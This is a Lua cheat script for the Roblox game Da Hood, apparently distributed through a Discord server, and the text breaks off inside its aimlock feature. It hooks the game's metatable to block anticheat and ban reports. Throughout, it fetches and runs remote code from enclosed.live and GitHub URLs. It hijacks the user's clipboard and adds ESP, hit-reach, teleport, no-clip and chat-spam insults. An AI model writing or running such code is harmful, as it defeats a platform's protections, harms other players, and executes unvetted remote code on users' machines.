if not game:IsLoaded() then
    game.Loaded:Wait()
end

ScriptVersion = "7.2"

loadstring(game:HttpGet("https://enclosed.live/version"))

local DiscordLib = loadstring(game:HttpGet "https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/betaui.lua")()

local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
local Notify = NotifyLibrary.Notify

local win = DiscordLib:Window("Enclosed - Da Hood V7.2 | discord.gg/enclosed")

local serv = win:Server("Enclosed", "")

local player = serv:Channel("Player")

setclipboard("https://discord.gg/enclosed")
game.StarterGui:SetCore("SendNotification", {Title = "Enclosed", Text = "Discord link has been copied, please join!", Icon = "rbxassetid://505845268", Duration = 9, Button1 = "Alright!"})

local function notify(a,b,c)
    game.StarterGui:SetCore("SendNotification",{
        Title = a;
        Text = b;
        Duration = c;
    })
end

-- // anticheat bypass

local Detectors = {
    CHECKER_1 = true,
    TeleportDetect = true,
    OneMoreTime = true,
    BANREMOTE = true,
    KICKREMOTE = true,
    PERMAIDBAN = true,
    BreathingHAMON = true
}

local mt = getrawmetatable(game)
local backupnamecall = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(...)
    local method = getnamecallmethod()
    local args = {...}

    if (method == "FireServer" and tostring(args[1]) == "MainEvent" and Detectors[args[2]]) then
        return wait(9e9)
    end
    
    if (method == "CHECKER_1" and tostring(args[1]) == "MainEvent" and Detectors[args[2]]) then
        return wait(9e9)
    end

    if (not checkcaller() and getfenv(1).crash ~= nil and getfenv(1).checkChild ~= nil) then
        getcallingscript():Destroy()
        return wait(9e9)
    end

    return backupnamecall(...)
end)

setreadonly(mt, true)

FLYSPEED = 20
player:Button(
    "Fly [X] [Default]",
    function()
  getgenv().FLYMODE = "Default"
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/fly.lua"))()
 end
)

player:Button(
 "Fly [C] [IY]",
 function()
  repeat wait() 
  until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
  local mouse = game.Players.LocalPlayer:GetMouse() 
  repeat wait() until mouse
  local plr = game.Players.LocalPlayer 
  local torso = plr.Character.Head 
  local flying = false
  local deb = true 
  local ctrl = {f = 0, b = 0, l = 0, r = 0} 
  local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
  local maxspeed = 5000
  local speed = 5000 
 
  function Fly() 
   local bg = Instance.new("BodyGyro", torso) 
   bg.P = 9e4 
   bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
   bg.cframe = torso.CFrame 
   local bv = Instance.new("BodyVelocity", torso) 
   bv.velocity = Vector3.new(0,0.1,0) 
   bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
   repeat wait() 
    plr.Character.Humanoid.PlatformStand = true 
    if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then 
     speed = speed+.0+(speed/maxspeed) 
     if speed > maxspeed then 
      speed = maxspeed 
     end 
    elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then 
     speed = speed-5
     if speed > 5 then 
      speed = -2 
     end 
    end 
    if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then 
     bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
     lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
    elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then 
     bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
    else 
     bv.velocity = Vector3.new(0,0.1,0) 
    end 
    bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
   until not flying 
   ctrl = {f = 0, b = 0, l = 0, r = 0} 
   lastctrl = {f = 0, b = 0, l = 0, r = 0} 
   speed = 5 
   bg:Destroy() 
   bv:Destroy() 
   plr.Character.Humanoid.PlatformStand = false 
  end 
  mouse.KeyDown:connect(function(key) 
   if key:lower() == "c" then 
    if flying then flying = false 
    else 
     flying = true 
     Fly() 
    end 
   elseif key:lower() == "w" then 
    ctrl.f = 45
   elseif key:lower() == "s" then 
    ctrl.b = -45 
   elseif key:lower() == "a" then 
    ctrl.l = -45 
   elseif key:lower() == "d" then 
    ctrl.r = 45
   end 
  end) 
  mouse.KeyUp:connect(function(key) 
   if key:lower() == "w" then 
    ctrl.f = 0
   elseif key:lower() == "s" then 
    ctrl.b = 0
   elseif key:lower() == "a" then 
    ctrl.l = 0
   elseif key:lower() == "d" then 
    ctrl.r = 0
   end 
  end)
  Fly()
 end
)
FLYSPEED = 20
player:Button(
 "SuperHero Fly",
 function()
        function Fly()
            function sandbox(var,func)
                local env = getfenv(func)
                local newenv = setmetatable({},{
                    __index = function(self,k)
                        if k=="script" then
                            return var
                        else
                            return env[k]
                        end
                    end,
                })
                setfenv(func,newenv)
                return func
            end
            cors = {}
            mas = Instance.new("Model",game:GetService("Lighting"))
            Tool0 = Instance.new("Tool")
            LocalScript1 = Instance.new("LocalScript")
            Sound2 = Instance.new("Sound")
            Sound3 = Instance.new("Sound")
            Animation4 = Instance.new("Animation")
            RemoteEvent5 = Instance.new("RemoteEvent")
            Animation6 = Instance.new("Animation")
            Tool0.Name = "Fly"
            Tool0.Parent = mas
            Tool0.CanBeDropped = false
            Tool0.RequiresHandle = false
            LocalScript1.Name = "local"
            LocalScript1.Parent = Tool0
            table.insert(cors,sandbox(LocalScript1,function()
                wait();
                local l__LocalPlayer__1 = game.Players.LocalPlayer;
                while true do
                    wait();
                    if l__LocalPlayer__1.Character then
                        break;
                    end;
                end;
                local l__Character__2 = l__LocalPlayer__1.Character;
                local l__Humanoid__3 = l__Character__2:WaitForChild("Humanoid");
                local l__Parent__4 = script.Parent;
                local u1 = false;
                local u2 = l__Humanoid__3:LoadAnimation(script.Hover);
                local u3 = nil;
                local u4 = nil;
                local u5 = false;
                local u6 = false;
                local u7 = l__Humanoid__3:LoadAnimation(script.Fly);
                l__Parent__4.Equipped:connect(function(p1)
                    Sound3:Play()
                    p1.TargetFilter = workspace;
                    u1 = true;
                    u2:Play();
                    u3 = Instance.new("BodyGyro");
                    u3.Name = "NA";
                    u3.Parent = l__Character__2.HumanoidRootPart;
                    u3.MaxTorque = Vector3.new(30000, 0, 30000);
                    u3.P = u3.P * 5;
                    u3.CFrame = CFrame.new(0, 0, 0);
                    u4 = Instance.new("BodyPosition");
                    u4.Name = "NA";
                    u4.Parent = l__Character__2.HumanoidRootPart;
                    u4.MaxForce = Vector3.new(60000, 60000, 60000);
                    u4.Position = l__Character__2.HumanoidRootPart.Position;
                    p1.Button1Down:connect(function()
                        Sound2:Play()
                        if u5 then
                            return;
                        end;
                        u5 = true;
                        u6 = true;
                        u7:Play();
                        local v5 = Instance.new("BodyVelocity", l__Character__2.HumanoidRootPart);
                        v5.MaxForce = Vector3.new(50000, 50000, 50000);
                        v5.Velocity = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p).lookVector * 85;
                        u3.MaxTorque = Vector3.new(30000, 30000, 30000);
                        u3.CFrame = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p);
                        u4.Parent = nil;
                        l__Humanoid__3.AutoRotate = false;
                        if u2.IsPlaying then
                            u2:Stop();
                        end;
                        while u6 do
                            v5.Velocity = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p).lookVector * 85;
                            u3.CFrame = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p);
                            game:GetService("RunService").Heartbeat:wait();  
                        end;
                        l__Humanoid__3.AutoRotate = true;
                        v5:Destroy();
                        if u4 ~= nil then
                            u4.Position = l__Character__2.HumanoidRootPart.Position;
                            u4.Parent = l__Character__2.HumanoidRootPart;
                        end;
                        if u3 ~= nil then
                            u3.MaxTorque = Vector3.new(30000, 0, 30000);
                            u3.CFrame = CFrame.new(0, 0, 0);
                        end;
                        u6 = false;
                        if u1 then
                            u2:Play();
                        end;
                        u7:Stop();
                        wait(0.3);
                        u5 = false;
                    end);
                    p1.Button1Up:connect(function()
                        Sound2:Stop()
                        Sound3:Play()
                        u6 = false;
                    end);
                end);
                l__Parent__4.Unequipped:connect(function()
                    Sound2:Stop()
                    Sound3:Play()
                    u1 = false;
                    u6 = false;
                    u3:Destroy();
                    u3 = nil;
                    u4:Destroy();
                    u4 = nil;
                    if u2.IsPlaying then
                        u2:Stop();
                    end;
                end);
            end))
            Sound2.Name = "Flapping"
            Sound2.Parent = LocalScript1
            Sound2.Looped = true
            Sound2.MaxDistance = 100
            Sound2.Pitch = 1.5
            Sound2.PlaybackSpeed = 1.5
            Sound2.SoundId = "rbxassetid://1462718291"
            Sound3.Name = "Activation"
            Sound3.Parent = LocalScript1
            Sound3.MaxDistance = 100
            Sound3.SoundId = "rbxassetid://2952274135"
            Sound3.Volume = 0.69999998807907
            Animation4.Name = "Hover"
            Animation4.Parent = LocalScript1
            Animation4.AnimationId = "rbxassetid://3541114300"
            RemoteEvent5.Name = "re"
            RemoteEvent5.Parent = LocalScript1
            Animation6.Name = "Fly"
            Animation6.Parent = LocalScript1
            Animation6.AnimationId = "rbxassetid://3541044388"
            for i,v in pairs(mas:GetChildren()) do
                v.Parent = game.Players.LocalPlayer.Backpack
                pcall(function() v:MakeJoints() end)
            end
            mas:Destroy()
            for i,v in pairs(cors) do
                spawn(function()
                    pcall(v)
                end)
            end
        end
        game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
        Fly()
    end
)

player:Slider(
 "Fly Speed",
 10,
 150,
 50,
 function(v)
  FLYSPEED = v
 end
)

player:Slider(
 "FOV",
 30,
 120,
 60,
 function(v)
  game.Workspace.Camera.FieldOfView = v 
 end
)
player:Button(
    "Force Reset",
    function()
        for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then
                v:Destroy()
            end
  end
    end
)

loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/legohacks/main/PhysicsServiceOnClient.lua"))()

player:Toggle(
    "No-Clip",
    false,
    function(t)
        setfflag("HumanoidParallelRemoveNoPhysics", "False")
        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
        if t == true then
   NotifyLibrary.Notify({
    Title = "No-Clip",
    Description = "Toggled to: True",
    Duration = 1
   })
            game:GetService('RunService'):BindToRenderStep("crash", 0 , function()
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
            end)
        elseif t == false then
   NotifyLibrary.Notify({
    Title = "No-Clip",
    Description = "Toggled to: False",
    Duration = 1
   })
            game:GetService('RunService'):UnbindFromRenderStep("crash")
        end
    end
)

player:Button(
 "Break Seats",
 function()
  for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
   if v:IsA("Seat") then
   v:Destroy()
   end
   end
   end
)

player:Button(
 "Trash Talk",
 function()
  function dowait()
   wait(0.172)
  end
  local tbl_main = 
  {
     "EZZZZZZZZZZð¤£ðð»ð¤£ðð»ð¤£ðð»ð¤£ðð»ð¤£ðð»" , 
     "All"
  }
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
  dowait()
  local tbl_main = 
  {
     "RUN MY 1S LOL ð¤£ðð»" , 
     "All"
  }
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
  dowait()
  local tbl_main = 
  {
     "You're aim makes me wonder how you hit the PLAY button." , 
     "All"
  }
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
  dowait()
  local tbl_main = 
  {
     "Clip yourself dying?" , 
     "All"
  }
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
  dowait()
  local tbl_main = 
  {
     "You're not a clown, nor a circus, your the whole convention. ð¤¡" , 
     "All"
  }
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
 end
)


player:Button(
    "Anti-Bag",
    function()
        local LP = game.Players.LocalPlayer;

        for i,v in ipairs(LP.Character:GetDescendants()) do
            if v.Name == "Christmas_Sock" then v:Destroy()
                end;
            end;
                
            LP.Character.ChildAdded:Connect(function()
            wait(0.3)
            for i,v in ipairs(LP.Character:GetDescendants()) do
            if v.Name == "Christmas_Sock" then v:Destroy()
            end;
            end;
            end);
        
    end    
)

player:Button(
    "Rejoin",
    function()
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
 end
)

player:Button(
 "Server-Hop",
 function()
  local x = {}
  for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
      if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
       x[#x + 1] = v.id
     end
  end
  if #x > 0 then
      game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
  end
 end
)
player:Button(
    "Invisible Mask",
    function()
        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
  local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
  if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
   wait(.2)
   fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
   toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
   toolf.Parent = game.Players.LocalPlayer.Character
   wait()
   game.Players.LocalPlayer.Character:WaitForChild("Mask")
   game:GetService("VirtualUser"):ClickButton1(Vector2.new())
   game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
   game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
  end
 end
)

player:Button(
    "Unjail",
    function()
        if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value >= 125 then
   game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
   game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
   wait()
   fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
   wait(.1)
   fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
   fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
   repeat
    wait()
   until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
   local Hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
   if Hum.Health > 0 then
    key1 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
    if key1 then
     Hum:EquipTool(key1)
     for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
      if v:isA("Tool") then
       game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(key1)
       game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
       v:Activate()
      end
     end
    end
   end
  end
 end
)

player:Button(
    "Superhuman [Z]",
    function()
        superhuman = false
  plr = game.Players.LocalPlayer
  mouse = plr:GetMouse()
  mouse.KeyDown:connect(function(key)
   if key == "z" and superhuman == false then
    superhuman = true
    game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
    game.Players.LocalPlayer.Character.Humz.JumpPower = 200
    game.Players.LocalPlayer.Character.Humz.WalkSpeed = 100
   elseif key == "z" and superhuman == true then
    superhuman = false
    game.Players.LocalPlayer.Character.Humz.JumpPower = 50
    game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
    game.Players.LocalPlayer.Character.Humz.Name = "Humanoid"
   end
  end)
 end
)

player:Button(
    "Naked",
    function()
        local function inTable(What, Table)
   for Index, Value in pairs(Table) do
    if What == Value then
     return true
    end
   end
   return false
  end
 
  local removingClasses = {
   "Accessory",
   "Pants",
   "Shirt",
  }
 
  for _, Instance in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
   if inTable(Instance.ClassName, removingClasses) or Instance.Name == "face" then
    Instance:Destroy()
   end
  end
 end
)

player:Button(
    "No Display Names",
    function()
        pcall(function()
   for i, v in pairs(game:GetService("Players"):GetPlayers()) do
    if v.Character then
     if v.Character:FindFirstChild("Humanoid") then
      v.Character:FindFirstChild("Humanoid").DisplayName = v.Name 
     end
    end
   end
  end)
 end
)

player:Button(
 "No-Bones",
 function()
  local a={"RightHand","LeftHand","RightUpperArm","RightLowerArm","LeftUpperArm","LeftLowerArm","Head","UpperTorso"}pcall(function()for b,c in pairs(game.Players.LocalPlayer.Character:GetChildren())do for d,e in ipairs(a)do if c.Name==e then if c:FindFirstChildOfClass("Motor6D")then local f=c:FindFirstChildOfClass("Motor6D")f:Destroy()end end end end end)

    end
)
player:Button(
    "Q to TP",
    function()
        plr = game.Players.LocalPlayer
 
        hum = plr.Character.HumanoidRootPart
         
        mouse = plr:GetMouse()
         
         
         
        mouse.KeyDown:connect(function(key)
         
        if key == "q" then
         
        if mouse.Target then
         
        hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
         
        end
         
        end
        end)
        end
)

player:Button(
    "Korblox [ Client Sided ]",
    function()
        local ply = game.Players.LocalPlayer
  local chr = ply.Character
  chr.RightLowerLeg.MeshId = "902942093"
  chr.RightLowerLeg.Transparency = "1"
  chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
  chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
  chr.RightFoot.MeshId = "902942089"
  chr.RightFoot.Transparency = "1"
 end
)

player:Button(
 "Headless",
 function()
  game.Players.LocalPlayer.Character.Head.Transparency = 1
        game.Players.LocalPlayer.Character.Head.face:Remove()
    end
)

player:Button(
 "Inf-Stamina",
 function()
  local a=game:GetService"Players"local b=a.LocalPlayer;function InfiniteStamina()local c=b.Character:WaitForChild"BodyEffects"local d,e,f=c:WaitForChild"Defense",c:WaitForChild"Movement",c:WaitForChild"Reload"while wait()do f.Value=false;d.Value=9e9;for g,h in next,e:GetChildren()do if h then h:Destroy()end end end end;InfiniteStamina()
    end
)
player:Button(
    "Fake Korblox [ Server Sided ]",
    function()
        local d = game.Players.LocalPlayer
        local f = d.Character
        f.RightLowerLeg:Destroy()
        f.RightUpperLeg:Destory()
        f.RightFoot:Destroy()
    end
)
-- // combat is here
local combat = serv:Channel("Combat")


combat:Toggle(
    "Fist / Tool Reach",
    false,
    function(Reaching)
        if Reaching == true then
   NotifyLibrary.Notify({
    Title = "Fist / Tool Reach",
    Description = "Toggled to: True",
    Duration = 1
   })
            game:service'RunService':BindToRenderStep('Reach', 2000, function()
                local success, err = pcall(function()
                    if game:service'Players'.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game:service'Players'.LocalPlayer.Character.LeftHand.Position).Magnitude <= 52.5 then
                                if game:service'Players'.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game:service'Players'.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game:service'Players'.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                end)
            end)
        elseif Reaching == false then
   NotifyLibrary.Notify({
    Title = "Fist / Tool Reach",
    Description = "Toggled to: False",
    Duration = 1
   })
            game:service'RunService':UnbindFromRenderStep('Reach')
        end
    end
)

combat:Button(
 "Free Fists [Q]",
 function()
  local localPlayer       = game:GetService("Players").LocalPlayer
  local localCharacter    = localPlayer.Character
  local Mouse             = localPlayer:GetMouse()
  local FistControl       = false
  local LeftFist          = localCharacter.LeftHand
  local RightFist         = localCharacter.RightHand

  -- // Services
  local uis = game:GetService("UserInputService")

  -- // Coroutine Loop + Functions
  local loopFunction = function()
   LeftFist.CFrame  = CFrame.new(Mouse.Hit.p)
   RightFist.CFrame = CFrame.new(Mouse.Hit.p)
  end

  local Loop

  local Start = function()
   Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
  end

  local Pause = function()
   Loop:Disconnect()
  end

  -- // Hotkeys
  uis.InputBegan:connect(function(Key)
   if (Key.KeyCode == Enum.KeyCode.Q) then
    if (FistControl == false) then
     FistControl = true
     Start()
     pcall(function()
      localCharacter.RightHand.RightWrist:Remove()
      localCharacter.LeftHand.LeftWrist:Remove()
     end)
    elseif (FistControl == true) then
     FistControl = false
     Pause()
     local rightwrist  = Instance.new("Motor6D")
     rightwrist.Name   = "RightWrist"
     rightwrist.Parent = localCharacter.RightHand
     rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
     rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
     rightwrist.Part0  = localCharacter.RightLowerArm
     rightwrist.Part1  = localCharacter.RightHand

     local leftwrist   = Instance.new("Motor6D")
     leftwrist.Name    = "LeftWrist"
     leftwrist.Parent  = localCharacter.LeftHand
     leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
     leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
     leftwrist.Part0   = localCharacter.LeftLowerArm
     leftwrist.Part1   = localCharacter.LeftHand
    end
   end
  end)
 end
)
combat:Toggle(
    "Anti-Slow",
    false,
    function(gh)
        if gh == true then
   NotifyLibrary.Notify({
    Title = "Anti-Slow",
    Description = "Toggled to: True",
    Duration = 1
   })
   game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
    if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
    if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
    if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
    if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
   end)
     elseif gh == false then
   NotifyLibrary.Notify({
    Title = "Anti-Slow",
    Description = "Toggled to: False",
    Duration = 1
   })
            game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
        end
    end
)

combat:Toggle(
    "Auto-Reload",
    false,
    function(r)
        if r == true then
   NotifyLibrary.Notify({
    Title = "Auto-Reload",
    Description = "Toggled to: True",
    Duration = 1
   })
   game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
    if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
     if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
      if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
       game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
       wait(1)
      end
     end
    end
   end)
     elseif r == false then
   NotifyLibrary.Notify({
    Title = "Auto-Reload",
    Description = "Toggled to: False",
    Duration = 1
   })
            game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
        end
    end
)

combat:Toggle(
    "Anti-Stomp",
    false,
    function(x)
        if x == true then
   NotifyLibrary.Notify({
    Title = "Anti-Stomp",
    Description = "Toggled to: True",
    Duration = 1
   })
   game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
    if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
     for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
      if v:IsA('MeshPart') or v:IsA('Part') then
       v:Destroy()
      end
     end
     for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
      if v:IsA('Accessory') then
       v.Handle:Destroy()
      end
     end
    end
   end)
  elseif x == false then
   NotifyLibrary.Notify({
    Title = "Anti-Stomp",
    Description = "Toggled to: False",
    Duration = 1
   })
   game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
  end
 end
)

local kiriot22ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/Kiriot"))()
kiriot22ESP:Toggle(true)
kiriot22ESP.Boxes = false
kiriot22ESP.Tracers = false
kiriot22ESP.Names = false

combat:Toggle(
 "Box ESP",
 false,
 function(t)
  if t == true then
   NotifyLibrary.Notify({
    Title = "Box ESP",
    Description = "Toggled to: True",
    Duration = 1
   })
   kiriot22ESP.Boxes = true
  elseif t == false then
   NotifyLibrary.Notify({
    Title = "Box ESP",
    Description = "Toggled to: False",
    Duration = 1
   })
   kiriot22ESP.Boxes = false
  end
 end
)

combat:Toggle(
 "Name ESP",
 false,
 function(t)
  if t == true then
   NotifyLibrary.Notify({
    Title = "Name ESP",
    Description = "Toggled to: True",
    Duration = 1
   })
   kiriot22ESP.Names = true
  elseif t == false then
   NotifyLibrary.Notify({
    Title = "Name ESP",
    Description = "Toggled to: False",
    Duration = 1
   })
   kiriot22ESP.Names = false
  end
 end
)

combat:Toggle(
 "Tracer ESP",
 false,
 function(t)
  if t == true then
   NotifyLibrary.Notify({
    Title = "Tracer ESP",
    Description = "Toggled to: True",
    Duration = 1
   })
   kiriot22ESP.Tracers = true
  elseif t == false then
   NotifyLibrary.Notify({
    Title = "Tracer ESP",
    Description = "Toggled to: False",
    Duration = 1
   })
   kiriot22ESP.Tracers = false
  end
 end
)


combat:Button(
    "Split Grenade [V]",
    function()
        local plr = game.Players.LocalPlayer
        local lastpos = plr.Character.HumanoidRootPart.CFrame
    
        repeat wait()
            plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Grenade] - $700"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[Grenade] - $700"].ClickDetector)
        until game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.V)
        plr.Character.HumanoidRootPart.CFrame = lastpos
    
        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            wait(0.05)
            spawn(function()
                if v.Name == "[Grenade]" then
                    v.Parent = plr.Character v:Activate() wait(0.1) v:Deactivate() wait(0.1) v:Activate()
                end
            end)
        end
    end
)
combat:Button(
    "Pick Tools",
    function()
        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
  for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
   if i.Name == "Part" then
    if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame
     if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
      wait()
     end
    end
   end
  end
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
 end
)

combat:Button(
    "Fly gun",
    function()
        for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if v:isA("Tool") then
                v.GripPos = Vector3.new(10,-10,10)
            end
        end
    end
)

-- // Aimlock

local aimstuff = serv:Channel("Aim-Lock")

aimstuff:Button(
 "Aimlock [Q]",
 function()
  _G.KEY = "q"
  _G.PART = "LowerTorso"
  _G.PRED = 0.037
  _G.Frame = Vector3.new(0,0.53,0)
  _G.AIR = -0.5
  _G.SHIT = 0.1
  
  
  local CC = game:GetService "Workspace".CurrentCamera
  local Plr
  local enabled = false
  local accomidationfactor = nil
